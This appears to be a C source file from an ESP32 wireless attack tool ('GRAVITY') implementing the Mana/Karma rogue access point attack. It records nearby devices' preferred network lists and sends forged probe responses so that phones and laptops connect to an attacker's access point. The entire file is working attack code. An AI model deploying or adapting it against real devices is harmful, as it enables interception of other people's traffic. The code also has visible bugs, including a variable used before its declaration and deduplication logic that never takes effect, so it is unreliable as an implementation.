#include "mana.h"
#include "common.h"
#include "esp_err.h"

const char *MANA_TAG = "mana@GRAVITY";

uint8_t PRIVACY_OFF_BYTES[] = {0x01, 0x11};
uint8_t PRIVACY_ON_BYTES[] = {0x11, 0x11};

int networkCount = 0;
PROBE_RESPONSE_AUTH_TYPE mana_auth = AUTH_TYPE_NONE;

esp_err_t mana_handleBroadcastProbe(uint8_t *payload, uint8_t bCurrentMac[6], uint8_t bDestMac[6], uint16_t seqNum) {
    /* Mana Loud implementation - Respond to a broadcast probe by sending a probe response
       for every SSID in all STAs.
       I was undecided between getting a unique set of SSIDs to send a single response per SSID,
       and just sending responses for every SSID in every station - doubtless with many
       duplicates.
       I settled on the latter, but with flawed reasoning.
       TODO: Refactor the below to send a maximum of one probe response for each AP
    */
    esp_err_t err = ESP_OK;
    /* Update to Mana Loud - Do NOT send duplicate packets where many STAs know an AP */
    int loudSSIDCount = 0;
    char **loudSSIDs = NULL;
    char strDestMac[18];
    mac_bytes_to_string(bDestMac, strDestMac);
    int i;
    for (i = 0; i < networkCount; ++i) {
        if (!strcasecmp(strDestMac, networkList[i].strMac) || attack_status[ATTACK_MANA_LOUD]) {
        /* Cycle through networkList[i]'s SSIDs */
            for (int j=0; j < networkList[i].ssidCount; ++j) {
                if (!arrayContainsString(loudSSIDs, loudSSIDCount, networkList[i].ssids[j])) {
                    /* Add it */
                    char **newLoud = malloc(sizeof(char *) * (loudSSIDCount + 1));
                    if (newLoud == NULL) {
                        ESP_LOGE(MANA_TAG, "Failed to realloc space for used Mana Loud SSIDs, I don't know what will happen now");
                    }
                    for (int k = 0; k < loudSSIDCount; ++k) {
                        newLoud[k] = loudSSIDs[k];
                    }
                    if (loudSSIDCount > 0) {
                        free(loudSSIDs);
                        loudSSIDs = newLoud;
                        ++loudSSIDCount;
                    }
                    #ifdef CONFIG_DEBUG
                        #ifdef CONFIG_FLIPPER
                            printf("Probe Response to:\n%20s\n", strDestMac);
                        #else
                            ESP_LOGI(MANA_TAG, "Sending probe response to %s for \"%s\"", strDestMac, networkList[i].ssids[j]);
                        #endif
                    #endif
                    err = send_probe_response(bCurrentMac, bDestMac, networkList[i].ssids[j], mana_auth, seqNum);
                }
            }
        }
    }
    if (loudSSIDCount > 0) {
        free(loudSSIDs);
    }
    return err;
}

esp_err_t mana_handleDirectedProbe(uint8_t *payload, uint8_t bCurrentMac[6], uint8_t bDestMac[6], uint16_t seqNum, char *ssid, int ssid_len) {
    /* Directed probe request - Send a directed probe response in reply */
    #ifdef CONFIG_FLIPPER
        char shortSsid[33];
        strcpy(shortSsid, ssid);
        if (strlen(shortSsid) > 20) {
            if (shortSsid[17] == ' ') {
                memcpy(&shortSsid[17], "...\0", 4);
            } else {
                memcpy(&shortSsid[18], "..\0", 3);
            }
        }
        printf("Rcvd directed probe:\n%20s\n", shortSsid);
    #else
        ESP_LOGI(MANA_TAG, "Received directed probe from %s for \"%s\"", strDestMac, ssid);
    #endif
    char strDestMac[18];
    mac_bytes_to_string(bDestMac, strDestMac);
    /* Mana attack - Add the current SSID to the station's preferred network
        list if it's not already there 
    */
    int i;
    /* Look for STA's MAC in networkList[] */
    for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
    if (i < networkCount) {
        /* The station is in networkList[] - See if it contains the SSID */
        #ifdef CONFIG_DEBUG
            ESP_LOGI(MANA_TAG, "STA %s matched to PNL for %s at networkList[%d]. PNL count: %d", strDestMac, networkList[i].strMac, i, networkList[i].ssidCount);
        #endif
        int j;
        for (j=0; j < networkList[i].ssidCount && strcmp(ssid, networkList[i].ssids[j]); ++j) { }
        if (j == networkList[i].ssidCount) {
            /* SSID was not found in ssids, add it to the list */
            #ifdef CONFIG_DEBUG
                ESP_LOGI(MANA_TAG, "SSID \"%s\" not found in PNL, add it", ssid);
            #endif
            char **newSsids = malloc(sizeof(char *) * (networkList[i].ssidCount + 1));
            if (newSsids == NULL) {
                ESP_LOGW(MANA_TAG, "Unable to add SSID \"%s\" to PNL for STA %s", ssid, strDestMac);
            } else {
                /* Copy existing SSIDs to newSsids */
                for (int k=0; k < networkList[i].ssidCount; ++k) {
                    newSsids[k] = networkList[i].ssids[k];
                }
                /* Append the new SSID */
                newSsids[j] = malloc(sizeof(char) * (strlen(ssid) + 1));
                if (newSsids[j] == NULL) {
                    ESP_LOGW(MANA_TAG, "Failed to allocate bytes to hold SSID \"%s\" for STA %s", ssid, strDestMac);
                    free(newSsids);
                } else {
                    strcpy(newSsids[j], ssid);
                    /* Only replace networkList[i].ssids with newSsids if we make it all this way */
                    free(networkList[i].ssids);
                    networkList[i].ssids = newSsids;
                    networkList[i].ssidCount++;
                }
            }
        }
    } else {
        /* Add the station to networkList[] */
        NetworkList *newList = malloc(sizeof(NetworkList) * (networkCount + 1));
        int newCount = networkCount + 1;
        if (newList == NULL) {
            ESP_LOGW(MANA_TAG, "Unable to allocate memory to hold the Preferred Network List for STA %s. This will downgrade the Mana attack to a Karma attack.", strDestMac);
        } else {
            /* Copy across elements from networkList[] */
            for (int j=0; j < networkCount; ++j) {
                newList[j].ssidCount = networkList[j].ssidCount;
                newList[j].ssids = networkList[j].ssids;
                strcpy(newList[j].strMac, networkList[j].strMac);
                memcpy(newList[j].bMac, networkList[j].bMac, 6);
            }
            /* Initialise a new NetworkList for this station */
            strcpy(newList[networkCount].strMac, strDestMac);
            memcpy(newList[networkCount].bMac, bDestMac, 6);
            newList[networkCount].ssidCount = 1;
            newList[networkCount].ssids = malloc(sizeof(char *));

            if (newList[networkCount].ssids == NULL) {
                ESP_LOGW(MANA_TAG, "Failed to allocate memory to hold SSID \"%s\" for STA %s. This SSID/STA pair will experience the Karma, not Mana, attack", ssid, strDestMac);
            } else {
                newList[networkCount].ssids[0] = malloc(sizeof(char) * (strlen(ssid) + 1));
                if (newList[networkCount].ssids[0] == NULL) {
                    ESP_LOGW(MANA_TAG, "Failed to reserve bytes to hold SSID \"%s\" for STA %s. This SSID/STA tuple will get the Karma attack instead.", ssid, strDestMac);
                } else {
                    strcpy(newList[networkCount].ssids[0], ssid);
                }
            }
            /* Replace networkList[] with newList[] - Without leaking memory */
            /* Loop through networkList[i].ssids and free each SSID before free'ing networkList itself*/
            /* Actually no, don't do that. ssids and its elements are copied into the new array */
            free(networkList);
            networkList = newList;
            networkCount = newCount;
        }
    }

    /* Send probe response */
    return send_probe_response(bCurrentMac, bDestMac, ssid, mana_auth, seqNum);
}

esp_err_t mana_handleProbeRequest(uint8_t *payload, char *ssid, int ssid_len) {
    /* Mana enabled - Send a probe response
       Get current MAC - NOTE: MAC hopping during the Mana attack will render the attack useless
                               Make sure you're not running a process that uses MAC randomisation at the same time
    */
    /* Prepare parameters that are needed to respond to both broadcast and directed probe requests */
    uint8_t bCurrentMac[6];
    char strCurrentMac[18];
    esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bCurrentMac);
    if (err == ESP_OK) {
        mac_bytes_to_string(bCurrentMac, strCurrentMac);
    } else {
        memcpy(bCurrentMac, &payload[PROBE_DESTADDR_OFFSET], 6);
        mac_bytes_to_string(bCurrentMac, strCurrentMac);
        ESP_LOGW(MANA_TAG, "Failed to get MAC from device, falling back to the frame's BSSID: %s\n", strCurrentMac);
    }
    /* Copy destMac into a 6-byte array */
    uint8_t bDestMac[6];
    memcpy(bDestMac, &payload[PROBE_SRCADDR_OFFSET], 6);
    char strDestMac[18];
    err = mac_bytes_to_string(bDestMac, strDestMac);
    if (err != ESP_OK) {
        ESP_LOGE(MANA_TAG, "Unable to convert probe request source MAC from bytes to string: %s", esp_err_to_name(err));
        return ESP_ERR_INVALID_RESPONSE;
    }

    /* Get sequence number */
    uint16_t seqNum = 0;
    seqNum = ((uint16_t)payload[PROBE_SEQNUM_OFFSET + 1] << 8) | payload[PROBE_SEQNUM_OFFSET];

    if (ssid_len == 0) {
        /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
        #ifdef CONFIG_DEBUG
            ESP_LOGI(MANA_TAG, "Received broadcast probe from %s", strDestMac);
        #endif

        mana_handleBroadcastProbe(payload, bCurrentMac, bDestMac, seqNum);
    } else {
        mana_handleDirectedProbe(payload, bCurrentMac, bDestMac, seqNum, ssid, ssid_len);
    }
    /* We shouldn't get here but if we do, call it good fortune */
    return ESP_OK;
}